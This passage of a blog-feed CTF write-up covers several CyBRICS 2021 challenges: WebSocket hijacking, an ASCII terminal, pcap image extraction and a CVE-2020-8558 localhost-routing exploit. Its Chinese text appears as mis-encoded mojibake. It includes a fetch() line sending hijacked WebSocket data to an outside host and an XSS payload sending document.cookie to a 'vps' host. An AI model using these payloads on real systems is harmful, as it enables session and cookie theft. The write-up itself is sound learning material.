&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hey, i forgot the flag. Can you remind me?&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2000&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…éžé¢„æœŸè§£ï¼šåœ¨urléƒ¨åˆ†è¿›è¡Œxssï¼Œpayload: &lt;code>javascript:location.href='http://vps/?cookie='+document.cookie&lt;/code>ï¼ˆæ­¤å¤„ç”¨çš„æ˜¯burp collaboratorï¼‰ç›´æŽ¥å¯ä»¥èŽ·å–æˆ¿é—´å·ï¼Œè¿žå…¥æˆ¿é—´åŽå‘æ¶ˆæ¯å³å¯æ‹¿åˆ°flag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729144122926.png" alt="image-20210729144122926">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729143946243.png" alt="image-20210729143946243">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.runoob.com/html/html5-websocket.html">HTML5 WebSocket&lt;/a> | &lt;a href="https://wiki.wgpsec.org/knowledge/web/websocket-sec.html">WebSocketå®‰å…¨é—®é¢˜åˆ†æž&lt;/a> &lt;a href="https://segmentfault.com/a/1190000014582485">WebSocketæ–­å¼€åŽŸå› åˆ†æž&lt;/a> | &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Request/mode">Request.mode&lt;/a> &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch">ä½¿ç”¨ Fetch&lt;/a> | &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WindowOrWorkerGlobalScope/fetch">WorkerOrGlobalScope.fetch()&lt;/a> | &lt;a href="https://www.freebuf.com/news/193447.html">Burpsuite Collaboratoræ¨¡å—è¯¦è§£&lt;/a> | &lt;a href="https://blog.fabiopires.pt/running-your-instance-of-burp-collaborator-server/">Running Your Instance of Burp Collaborator Server&lt;/a>ï¼ˆåˆ—å…¥å¾…å®Œæˆè®¡åˆ’&lt;/p>
&lt;h2 id="ascii-terminal-network-baby-116-pts">ASCII Terminal (Network, Baby, 116 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Artur Khanov (&lt;a href="https://t.me/awengar">@awengar&lt;/a>)&lt;/p>
&lt;p>At &lt;code>138.68.83.253:3333&lt;/code> you have an ASCII terminal. It really works, check with the &lt;a href="https://cybrics.net/files/id.txt">&lt;strong>id command&lt;/strong>&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ncè¿žä¸Šä»¥åŽå¯ä»¥çœ‹åˆ°ä¸€ä¸ªbash $ï¼Œé¢˜ç›®çš„æç¤ºæ˜¯&amp;quot;ASCII termial&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728231402633.png" alt="image-20210728231402633">&lt;/p>
&lt;p>æŠŠè¦æ‰§è¡Œçš„å‘½ä»¤ä¹Ÿè¡¨ç¤ºæˆè¿™ç§å½¢å¼åŽå‘é€å³å¯ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯linuxä¸‹çš„toiletå·¥å…·&lt;/p>
&lt;p>toiletå¯ä»¥æŠŠå­—æ¯æ‹¼æˆç”¨å­—ç¬¦æˆ–å…¶ä»–æ–¹å¼è¡¨ç¤ºçš„æ›´å¤§çš„å­—æ¯ï¼Œå¯ä»¥å¸¦ä¸€äº›å‚æ•°æ¥æŽ§åˆ¶å­—ä½“ å­—å·ä»¥åŠæ ·å¼ æ¯”å¦‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234413850.png" alt="image-20210728234413850">&lt;/p>
&lt;p>å¯ä»¥çŽ©å‡ºå¾ˆå¤šèŠ±æ ·~&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234351668.png" alt="image-20210728234351668">&lt;/p>
&lt;p>ä¹¦å½’æ­£é¢˜ï¼Œè¿™é‡Œä½¿ç”¨&lt;code>toilet -f bigascii9 +command&lt;/code>çš„å‘½ä»¤ç”Ÿæˆç»“æžœï¼Œå°†ç©ºæ ¼æ¢ä¸º &lt;code>.&lt;/code>å†å‘é€å³å¯&lt;/p>
&lt;pre tabindex="0">&lt;code>toilet -f bigascii9 ls &amp;gt; ls.txt
cat ls.txt | nc 138.68.83.253 3333 &amp;gt; ls_result.txt
toilet -f bigascii9 'cat flag.txt' &amp;gt; cat.txt
cat cat.txt | nc 138.68.83.253 2333 &amp;gt; flag.txt
&lt;/code>&lt;/pre>&lt;p>ï¼ˆå€¼å¾—æ³¨æ„çš„æ˜¯ å¦‚æžœç›´æŽ¥ä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤ç”Ÿæˆç›¸åº”æ–‡ä»¶åŽç”¨vimç¼–è¾‘å™¨çš„&lt;code>%s/\s/./g&lt;/code>å‘½ä»¤æ¥è¿›è¡Œç©ºæ ¼çš„æ›¿æ¢ï¼Œä¼šå‡ºçŽ°ä¸‹é¢è¿™æ ·çš„æƒ…å†µ é¦–éƒ¨å’Œå°¾éƒ¨éƒ½éœ€è¦æ‰‹åŠ¨ä¿®æ­£ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729002105318.png" alt="image-20210729002105318">&lt;/p>
&lt;p>æœ€åŽflagï¼šcybrics{T3553R4C7_15_GOOD}&lt;/p>
&lt;p>â€”â€”â€”â€”psï¼šåœ¨èµ›åŽçš„å®˜æ–¹youtubeç›´æ’­è®²è§£ä¸­å±•ç¤ºäº†è¿™ä¸ªascii terminalçš„æºç ï¼Œæ˜¯ä½¿ç”¨pythonç¼–å†™çš„ å¯¹è¿™ä¸ªterminalçš„è¿è¡Œæ„Ÿå…´è¶£çš„å¯ä»¥åˆ°&lt;a href="https://www.youtube.com/watch?v=SFnj6DRTIzE&amp;amp;t=2605s">å½•æ’­è§†é¢‘&lt;/a>ä¸­çœ‹&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.shuzhiduo.com/A/RnJW9QLBdq/">è°ƒçš®æ£è›‹çš„Linuxä¸‹æœ‰è¶£ç»ˆç«¯çš„åˆé›†&lt;/a> | &lt;a href="https://www.howtoing.com/create-ascii-text-banners-in-linux-terminal">Linux Fun - å¦‚ä½•åœ¨ç»ˆç«¯ä¸­åˆ›å»ºASCIIæ–‡æœ¬æ¨ªå¹…&lt;/a> | &lt;a href="https://www.howtoing.com/neofetch-shows-linux-system-information-with-logo/">Neofetch - æ˜¾ç¤ºå…·æœ‰åˆ†å‘æ ‡å¿—çš„Linuxç³»ç»Ÿä¿¡æ¯&lt;/a>&lt;/p>
&lt;h2 id="lx-100-network-easy-192-pts">LX-100 (Network, Easy, 192 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>We were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.&lt;/p>
&lt;p>Anyway, we were discussing CyBRICS flags there, hope thereâ€™s no way to leak them.&lt;/p>
&lt;p>&lt;a href="https://cybrics.net/files/lx100.pcap">&lt;strong>lx100.pcap&lt;/strong>&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ï¼ˆè¯´å®žè¯ï¼ŒpacpåŒ…æ˜¯çœŸçš„ä¸ä¼šçœ‹TAT&lt;/p>
&lt;p>é¦–å…ˆçœ‹åˆ°æœ‰HTTPçš„æµé‡ï¼Œè®¿é—®çš„æ˜¯http://192.168.54.1/cam.cgi?mode=getstateï¼Œè¿™æ˜¯Lumix GX80æ‘„åƒå¤´ï¼Œè§†é¢‘æµé€šè¿‡UDPä¼ è¾“ï¼›è¿½è¸ªUDPæµé‡ï¼Œå¯¼å‡ºæµé‡ å¹¶æ‰¹é‡æå–å‡ºå…¶ä¸­çš„jpgæ–‡ä»¶
ï¼ˆä»¥ä¸‹æ˜¯å®˜æ–¹ç»™å‡ºçš„è§£ ä½¿ç”¨äº†tsharkå·¥å…·ï¼ˆå³å‘½ä»¤è¡Œç‰ˆçš„wireshrkï¼ˆä½†æ˜¯è¿™ç§æ–¹æ³•æœ¬åœ°å¤çŽ°å¤±è´¥ å¯¼å‡ºçš„jpgæ— æ³•æ­£å¸¸è§£æž ä½†æ˜¯&lt;a href="https://www.youtube.com/watch?v=Sf_0f8PWNuI&amp;amp;t=80s">å®˜æ–¹è§†é¢‘ä¸­&lt;/a>ç¡®å®žè¿™æ ·å¯ä»¥æˆåŠŸ emmmm&lt;/p>
&lt;pre tabindex="0">&lt;code>tshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data &amp;gt; hex.txt
php -a
foreach(file(&amp;quot;hex.txt&amp;quot;)as $i =&amp;gt; $ln) {file_put_contents(&amp;quot;frame$i.jpg&amp;quot;,hex2bin(trim($ln)));}
&lt;/code>&lt;/pre>&lt;p>ï¼ˆä»¥ä¸‹æ˜¯åœ¨&lt;a href="https://scavengersecurity.com/posts/cybrics-lx100/">åˆ«çš„wp&lt;/a>ä¸­çœ‹åˆ°çš„pyè„šæœ¬ï¼š å¯æˆåŠŸå¤çŽ° å¯¼å‡º455å¼ jpgå›¾&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pyshark&lt;/span>
&lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pyshark&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FileCapture&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;lx100.pcap&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;UDP&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;udp&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">srcport&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">65415&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">udp_bytes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fromhex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">find&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ffd8ffdb&amp;#39;&lt;/span>&lt;span style="color:#111">):])&lt;/span>
&lt;span style="color:#111">file_out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;out_files/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">count&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;_packet.jpg&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;wb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">file_out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">udp_bytes&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/235_packet.jpg" alt="235_packet">&lt;/p>
&lt;p>&lt;del>æ”¾å¤§ å†æ”¾å¤§ æ¯ä¸€æ ¹&lt;/del> æœ€åŽçš„flagæ˜¯ &lt;code>cybrics{Lost_Secrets_In_The_AIr}&lt;/code>&lt;/p>
&lt;h2 id="localhost-network-hard-267-pts">localhost (Network, Hard, 267 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Remember NET fleeks? Iâ€™ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.&lt;/p>
&lt;pre tabindex="0">&lt;code>ssh localhost@109.233.61.10
Password: ohx7eeQu
&lt;/code>&lt;/pre>&lt;p>Your team token &amp;gt; Sw0T5cecsfJfaKApOiKzsA&lt;/p>
&lt;/blockquote>
&lt;p>å…ˆsshè¿žä¸Šçœ‹çœ‹æƒ…å†µï¼ˆå›¾ä¸­æœ‰ä¸€å¥å‘½ä»¤è¾“é”™äº† åº”è¯¥æ˜¯routes ç•™ä¸‹äº†è‹±è¯­ä¸å¥½çš„æ³ªæ°´&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729122432345.png" alt="image-20210729122432345">&lt;/p>
&lt;p>è‡ªå¸¦python2 python3 nmapï¼Œå¹¶ä¸”æœ¬èº«å°±æ˜¯rootèº«ä»½ï¼Œæ‰«ä¸€ä¸‹å†…ç½‘ç½‘æ®µ&lt;code>nmap -sS -Pn 10.193.10.7/24&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131318834.png" alt="image-20210729131318834">&lt;/p>
&lt;p>å‘çŽ°10.193.10.180çš„80ç«¯å£å¼€æ”¾ï¼Œç”¨curlè®¿é—®&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131419115.png" alt="image-20210729131419115">&lt;/p>
&lt;p>æç¤º&lt;em>Flag-containing-Records&lt;/em> æŽ¥ç€è®¿é—®ä¸¤ä¸ªè¶…é“¾æŽ¥çš„å†…å®¹&lt;/p>
&lt;p>&lt;code>curl 10.193.10.180/redis.conf&lt;/code>æ˜¯redisçš„é…ç½®æ–‡ä»¶ï¼Œå‡ ä¹Žæ‰€æœ‰çš„å†…å®¹éƒ½æ˜¯è¢«æ³¨é‡ŠæŽ‰çš„ç¤ºä¾‹å†…å®¹ï¼Œæœ‰ç”¨çš„å°±å†…å®¹å¹¶ä¸å¤šï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>bind 127.0.0.1
protected-mod yes
port 6379
&lt;/code>&lt;/pre>&lt;p>&lt;code>curl 10.193.10.180/sysctl.conf&lt;/code>ä¹Ÿæ˜¯ç›¸å…³çš„é…ç½®æ–‡ä»¶ åªæœ‰ä¸€å¥æ²¡è¢«æ³¨é‡Š&lt;/p>
&lt;pre tabindex="0">&lt;code>net.ipv4.conf.all.route_localnet=1
&lt;/code>&lt;/pre>&lt;p>æŸ¥googleï¼Œå‘çŽ°äº†è¿™äº›ï¼š&lt;a href="https://github.com/kubernetes/kubernetes/issues/90259">net.ipv4.conf.all.route_localnet=1 opens security issue #90259&lt;/a> | &lt;a href="https://github.com/tabbysable/POC-2020-8558">POC-2020-8558&lt;/a>&lt;/p>
&lt;p>æ˜¯ä¸€ä¸ªåŽ»å¹´çˆ†å‡ºçš„cveï¼Œå…·ä½“çš„å†…å®¹ æˆå› ä»¥åŠèƒŒæ™¯çŸ¥è¯†ä¸å¤šèµ˜è¿° ä¸Šé¢çš„é“¾æŽ¥ä¸­å†™çš„å¾ˆè¯¦ç»†ï¼Œè¿™é‡Œæ‘˜å–å‡ æ®µï¼š&lt;/p>
&lt;blockquote>
&lt;p>In order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code> sysctl setting. According to the kernel documentation, this setting makes the kernel &amp;ldquo;not consider loopback addresses as martian&amp;rdquo; &amp;ndash; a consequence of which is that they could be accessed by other nodes on the network. That&amp;rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!&lt;/p>
&lt;p>&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>A normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code> changes that &amp;ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.&lt;/p>
&lt;p>So, if an attacker has a local connection to a target node with &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code>, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.&lt;/p>
&lt;p>Note that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker&amp;rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.&lt;/p>
&lt;/blockquote>
&lt;p>ï¼ˆä¸å¾—ä¸è¯´ipv4å½“åˆæŠŠæ•´ä¸ª&lt;code>127.0.0.0/8&lt;/code>çš„åœ°å€éƒ½ç»™äº†æœ¬åœ°å›žçŽ¯ç”¨çœŸçš„æ˜¯å¤ªæ…·æ…¨äº†&amp;hellip;&amp;hellip; åˆ°ipv6å°±åªæœ‰ä¸€ä¸ª&lt;code>:: 1&lt;/code>&lt;/p>
&lt;p>åœ¨è¿™é‡Œç›´æŽ¥ç”¨pocæ‰“å³å¯ï¼Œå…³äºŽtest.pyå’Œpoc.pyè¿™é‡Œä¹Ÿæ‘˜å–ä¸€ä¸‹è¯´æ˜Ž&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>tst-2020-8558.py&lt;/strong>
Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to &lt;code>127.0.0.1&lt;/code> via your target, and looks to see if there is a reply.&lt;/p>
&lt;p>&lt;strong>poc-2020-8558.py&lt;/strong>
Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default).
Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal.
Because this script uses raw sockets to send and receive the &amp;ldquo;localhost&amp;rdquo; packets, it works fine inside a normal unprivileged container.&lt;/p>
&lt;/blockquote>
&lt;p>å› ä¸ºéœ€è¦nc æ‰€ä»¥å¦å¼€ä¸€ä¸ªshell&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153443403.png" alt="image-20210729153443403">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153501930.png" alt="image-20210729153501930">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://jan.show/?p=128">wp&lt;/a> | &lt;a href="https://www.zhihu.com/question/49866806">ä¸ºä»€ä¹ˆæ•´ä¸ª127.*ç½‘æ®µéƒ½è¢«æ‹¿æ¥å½“åšçŽ¯å›žåœ°å€äº†ï¼Ÿ&lt;/a>&lt;/p>
&lt;hr>
&lt;p>æœ¬äººæ¯”è¾ƒèœï¼Œåªåšå‡ºæ¥äº†ç­¾åˆ°é¢˜å’Œå‡ ä¸ªwebï¼Œå…¶ä½™å‡ä¸ºèµ›åŽå¤ç›˜ï¼Œ&lt;a href="https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw">æ­¤å¤„æ˜¯å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>é“é˜»ä¸”é•¿å‘€ï¼Œæš‘å‡è¦å¥½å¥½åŠªåŠ›å’¯ (ã¤Ð´âŠ‚)
å‚ç…§ä¸€äº›æ•™ç¨‹æŠŠç®€å•çš„åšå®¢ä¹Ÿæ­èµ·æ¥äº†ï¼Œä»¥åŽè¦æŠŠè¿™ä¸ªå°çªæ…¢æ…¢ä¸°å¯Œèµ·æ¥(ã‚âˆ€ï½¥)â˜†&lt;/p></description></item></channel></rss>